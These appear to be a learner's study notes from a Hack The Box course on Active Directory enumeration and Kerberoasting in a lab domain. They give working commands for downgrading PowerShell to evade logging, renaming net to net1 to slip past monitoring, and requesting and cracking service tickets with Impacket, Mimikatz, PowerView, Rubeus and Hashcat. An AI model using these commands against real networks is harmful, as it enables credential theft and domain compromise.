	> We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the PowerShell Operational Log found under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational. All commands executed in our session will log to this file. The Windows PowerShell log located at Applications and Services Logs > Windows PowerShell is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.
	> With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command powershell.exe -version 2 within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.

* Checking Defenses

	> The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
	> Firewall Checks
		PS C:\htb> netsh advfirewall show allprofiles

	> Windows Defender Check (from CMD.exe)

		C:\htb> sc query windefend

	> Above, we checked if Defender was running. Below we will check the statuss
	jjjvand configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.
	> Get-MpComputerStatus
		PS C:\htb> Get-MpComputerStatus

	> Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.

* Am I Alone?

	> When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
	> Get-MpComputerStatus
		PS C:\htb> qwinsta

	> Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

* Network Information
	! Networking Commands 		Description
	> arp -a 			Lists all known hosts stored in the arp table.
	> ipconfig /all 		Prints out adapter settings for the host. We can figure out the network segment from here.
	> route print 			Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
	> netsh advfirewall show state 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.

	> Commands such as ipconfig /all and systeminfo show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. arp -a and route print will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning
	> Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

* Windows Management Instrumentation (WMI)
	> Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
	> Quick WMI checks
		! Command 										Description
		- wmic qfe get Caption,Description,HotFixID,InstalledOn 				Prints the patch level and description of the Hotfixes applied
		- wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 	Displays basic host information to include any attributes within the list
		- wmic process list /format:list 							A listing of all processes on host
		- wmic ntdomain list /format:list 							Displays information about the Domain and Domain Controllers
		- wmic useraccount list /format:list 							Displays information about all local accounts and any domain accounts that have logged into the device
		- wmic group list /format:list 								Information about all local groups
		- wmic sysaccount list /format:list 							Dumps information about any system accounts that are being used as service accounts.

	> Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This cheatsheet(https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
		PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

			Caption          Description      DnsForestName           DomainControllerAddress  DomainName
			ACADEMY-EA-MS01  ACADEMY-EA-MS01
			INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
			LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
			FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC

* Net Commands

	> Net commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

    		- Local and domain users
    		- Groups
    		- Hosts
    		- Specific users in groups
    		- Domain Controllers
    		- Password requirements

	> We'll cover a few examples below. Keep in mind that net.exe commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as whoami, and net localgroup administrators, etc. This could be an obvious red flag to anyone monitoring the network heavily.
	> Table of Useful Net Commands
		Command 					Description
		net accounts 					Information about password requirements
		net accounts /domain 				Password and lockout policy
		net group /domain 				Information about domain groups
		net group "Domain Admins" /domain 		List users with domain admin privileges
		net group "domain computers" /domain 		List of PCs connected to the domain
		net group "Domain Controllers" /domain 		List PC accounts of domains controllers
		net group <domain_group_name> /domain 		User that belongs to the group
		net groups /domain 				List of domain groups
		net localgroup 					All available groups
		net localgroup administrators /domain 		List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
		net localgroup Administrators 			Information about a group (admins)
		net localgroup administrators [username] /add 	Add user to administrators
		net share 					Check current shares
		net user <ACCOUNT_NAME> /domain 		Get information about a user within the domain
		net user /domain 				List all users of the domain
		net user %username% 				Information about the current user
		net use x: \computer\share 			Mount the share locally
		net view 					Get a list of computers
		net view /all /domain[:domainname] 		Shares on the domains
		net view \computer /ALL 			List shares of a computer
		net view /domain 				List of PCs of the domain


	> Net Commands Trick
		If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.

* Dsquery

	> Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.
	> Dsquery DLL
	> All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.
	> 	Command				Description
		Dsquery *			Finds objects in the active directory according to search criteria using an LDAP query.
		Dsquery user			Finds the user objects in the active directory according to specified search criteria.
		Dsquery computer		Finds the computers in the active directory according to specified search criteria.
		Dsquery group			Finds the groups in the active directory according to specified search criteria.
		Dsquery ou			Finds the organizational units (OUs) in the active directory according to specified search criteria.
		Dsquery contact			Finds the contacts in the active directory that matches the specified search criteria.
		Dsquery site			Finds the sites in the active directory that matches the specified search criteria.
		Dsquery server			Finds the domain controllers in the active directory according to specified search criteria.
		Dsquery quota			Finds the quota specifications in the active directory that matches the specified search criteria. 
						A quota specification determines the maximum number of directory objects a specified security principal
						owns in a given directory partition.
		Dsquery partition		Finds the partition objects in the active directory that matches the specified search criteria.


	> El comando dsget funciona mediante el DN de los objetos 
	> Se puede combinar dsquery con dsget 
		dsquery user -name P* | dsget user -samid -display
	> We can use a dsquery wildcard search to view all objects in an OU, for example.
	> Wildcard Search
		PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

	> We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.
	> Users With Specific Attributes Set (PASSWD_NOTREQD)
		PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

	> Another example querying for detailed information about a user 
		dsquery * -filter "(objectclass=user)" -attr * -limit 1
	> The below search filter looks for all Domain Controllers in the current domain, limiting to five results.
	> Searching for Domain Controllers
		PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
	> A compound filter will look like these:
		- Here the & indicates that it is a compound filter, and any results must have both values for the corresponding attribute. With the ! symbol you can exclude items in your filters, but be sure to wrap it in a set of parenthesis. You can also exclude some results like this:
			“(&(attribute1=value1)(attribute2=value2))”
		- This filter will produce a list of results where the objects have value1 for attribute1 but do not have value2 for attribute2. These filters will work the same between dsquery and ldapsearch. Depending on what command line utility you are using, you may have difficulty with the ! symbol.
		 	“(&(attribute1=value1)(!(attribute2=value2)))”
	> Using filters 
		PS C:\Tools> dsquery * -filter "(&(objectclass=computer)(name=*win*))" -attr name description -d 172.16.5.5
		PS C:\Tools> dsquery * -filter "(objectclass=user)" -attr name description -d 172.16.5.5
	> PasswordLast Set 
		- Password Last Set: The pwdLastSet attribute may help you when you are looking for accounts to target. Service accounts sometimes have older and more simple passwords because they are needed for specific functions and changing them can be difficult depending on what they are used for. This can also be a quick check during an assessment to see if the organization’s password policy is properly implemented.
			PS C:\Windows\system32> dsquery * -filter "(objectclass=user)" -attr name pwdlastset -d 172.16.5.5
			PS C:\Windows\system32> w32tm.exe /ntte 132798298291720078
		//Filtering for less time than pwdlastset administrator
			PS C:\Windows\system32> dsquery * -filter "(&(objectclass=user)(pwdlastset<=132798197726313370))" -attr name pwdlastest -d 172.16.5.5
		dsquery * -filter “(&(memberof=CN=Staff,DC=PLANETEXPRESS,DC=LOCAl)(memberof=CN=ShipCrew,DC=PLANETEXPRESS,DC=LOCAL))” -attr name memberof -d 192.168.88.195
	> Options
		-attr *
		-d //domain by FQDN or IP 
		-u -p // Username and password to use for querying AD

* LDAP Filtering Explained

	> You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:
	> userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs ==> https://ldap.com/ldap-oid-reference-guide/).
	> =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.
	> UAC Values
		(https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

* OID match strings
	> OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
	     1.2.840.113556.1.4.803
	> When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
	     1.2.840.113556.1.4.804
	> When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
	     1.2.840.113556.1.4.1941

	> This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

* Logical Operators
	> When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
	> (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
	> The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
	> (&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
	> This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

-==-=
[+] Kerberoasting - from Linux

Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.
* Kerberoasting Overview
	> Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
	> Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.
	> Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.
	> For an interesting look at the origin of this technique, check out the talk Tim Medin(https://www.youtube.com/watch?v=PUyhlN-E5MU) gave at Derbycon 2014, showcasing Kerberoasting to the world.

* Kerberoasting - Performing the Attack

	> Depending on your position in a network, this attack can be performed in multiple ways:

    		- From a non-domain joined Linux host using valid domain user credentials.
    		- From a domain-joined Linux host as root after retrieving the keytab file.
    		- From a domain-joined Windows host authenticated as a domain user.
    		- From a domain-joined Windows host with a shell in the context of a domain account.
    		- As SYSTEM on a domain-joined Windows host.
    		- From a non-domain joined Windows host using runas /netonly.

	> Several tools can be utilized to perform the attack:

    		- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
    		- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
    		- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.

	> Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

* Efficacy of the Attack

	> While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access. I would likely write up the finding as high-risk in my report in the first two cases. In the third case, we may Kerberoast and end up unable to crack a single TGS ticket, even after days of cracking attempts with Hashcat on a powerful GPU password cracking rig. In this scenario, I would still write up the finding, but I would drop it down to a medium-risk issue to make the client aware of the risk of SPNs in the domain (these strong passwords could always be changed to something weaker or a very determined attacker may be able to crack the tickets using Hashcat), but take into account the fact that I was unable to take control of any domain accounts using the attack. It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.

* Performing the Attack

	> Kerberoasting attacks are easily done now using automated tools and scripts. We will cover performing this attack in various ways, both from a Linux and a Windows attack host. Let's first go through how to do this from a Linux host. The following section will walk through a "semi-manual" way of performing the attack and two quick, automated attacks using common open-source tools, all from a Windows attack host.
	> Kerberoasting with GetUserSPNs.py
	> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.
	> Let's start by installing the Impacket toolkit, which we can grab from Here(https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:
	> Installing Impacket using Pip
		m1l0js@htb[/htb]$ sudo python3 -m pip install .

	> This will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host. Impacket is already installed on the attack host that we can spawn at the end of this section to follow along and work through the exercises. Running the tool with the -h flag will bring up the help menu.
	> We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.
	> Listing SPN Accounts with GetUserSPNs.py
		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
	> We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
	> Requesting all TGS Tickets
		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

	> We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
	> Requesting a Single TGS ticket
		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
	> With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.
	> To facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
	> Saving the TGS Ticket to an Output File
		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

	> Here we've written the TGS ticket for the sqldev user to a file named sqldev_tgs. Now we can attempt to crack the ticket offline using Hashcat hash mode 13100.
	> Cracking the Ticket Offline with Hashcat
		m1l0js@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

	> We've successfully cracked the user's password as database!. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.
	> Testing Authentication against a Domain Controller
		m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

[+] Kerberoasting - from Windows


* Kerberoasting - Semi Manual method
	> Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in setspn binary to enumerate SPNs in the domain.
	> Enumerating SPNs with setspn.exe
		C:\htb> setspn.exe -Q */*

	> We will notice many different SPNs returned for the various hosts in the domain. We will focus on user accounts and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user:
	> Targeting a Single User
		PS C:\htb> Add-Type -AssemblyName System.IdentityModel
		PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
			ValidFrom            : 2/24/2022 11:36:22 PM
			ValidTo              : 2/25/2022 8:55:25 AM
		ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

	> Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):

    		- The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
    		- The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
    		- System.IdentityModel is a namespace that contains different classes for building security token services
    		- We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
    		- We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

	> We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.
	> Retrieving All Tickets Using setspn.exe
		PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
			ValidFrom            : 2/24/2022 11:56:18 PM
			ValidTo              : 2/25/2022 8:55:25 AM
			ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
			
			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
			ValidFrom            : 2/24/2022 11:56:18 PM
			ValidTo              : 2/24/2022 11:58:18 PM
			ServicePrincipalName : kadmin/changepw
			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
			
			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
			ValidFrom            : 2/24/2022 11:56:18 PM
			ValidTo              : 2/25/2022 8:55:25 AM
			ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey


	> The above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.
	> Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

* Extracting Tickets from Memory with Mimikatz
	> Retrieving All Tickets Using setspn.exe
		mimikatz # base64 /out:true
		mimikatz # kerberos::list /export  

	> If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.
	> Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
	> Preparing the Base64 Blob for Cracking
		m1l0js@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 

	> We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.
	> Placing the Output into a File as .kirbi
		m1l0js@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi

	> Next, we can use this(https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the kirbi2john.py tool to extract the Kerberos ticket from the TGS file.
	> Extracting the Kerberos Ticket using kirbi2john.py
		m1l0js@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi

	> This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
	> Modifiying crack_file for Hashcat
		m1l0js@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

	> Now we can check and confirm that we have a hash that can be fed to Hashcat.
	> Viewing the Prepared Hash
		m1l0js@htb[/htb]$ cat sqldev_tgs_hashcat 

	> We can then run the ticket through Hashcat again and get the cleartext password database!.
	> Cracking the Hash with Hashcat
		m1l0js@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

	> If we decide to skip the base64 output with Mimikatz and type mimikatz # kerberos::list /export, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.
	> Now that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, let's look at some quicker ways. Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time. That being said, it can be useful for us to have other tricks up our sleeves and methodologies in case our automated tools fail or are blocked.

* Automated / Tool Based Route
	> Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use PowerView to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.
	> Using PowerView to Extract TGS Tickets
		PS C:\htb> Import-Module .\PowerView.ps1
		PS C:\htb> Get-DomainUser * -spn | select samaccountname

	> From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
	> Using PowerView to Target a Specific User
		PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

	> Finally, we can export all tickets to a CSV file for offline processing.
	> Exporting All Tickets to a CSV File
		PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
	> Viewing the Contents of the .CSV File
		PS C:\htb> cat .\ilfreight_tgs.csv

	> We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
	> Using Rubeus
		PS C:\htb> .\Rubeus.exe

	> As we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks. Some options include:

    		- Performing Kerberoasting and outputting hashes to a file
    		- Using alternate credentials
    		- Performing Kerberoasting combined with a pass-the-ticket attack
    		- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
    		- Requesting tickets for accounts passwords set between a specific date range
    		- Placing a limit on the number of tickets requested
    		- Performing AES Kerberoasting

* Viewing Rubeus's Capabilities
	> We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.
	> Using the /stats Flag
		PS C:\htb> .\Rubeus.exe kerberoast /stats
	> Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
	> Using the /nowrap Flag
		PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

* A Note on Encryption Types
	> The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.
	> Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker(https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
	> Let's start by creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.
	> Using the /nowrap Flag
		PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

	> Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here(https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
		PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

	> Next, let's crack this ticket using Hashcat and note how long it took. The account is set with a weak password found in the rockyou.txt wordlist for our purposes. Running this through Hashcat, we see that it took four seconds to crack on a CPU, and therefore it would crack almost instantly on a powerful GPU cracking rig and probably even on a single GPU.
	> Cracking the Ticket with Hashcat & rockyou.txt
		m1l0js@htb[/htb]$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 

	> Let's assume that our client has set SPN accounts to support AES 128/256 encryption. (Active Directory Users and Computers ==> Users ==> testspn Properties ==> Account options)
	> If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
	> Checking Supported Encryption Types
		PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

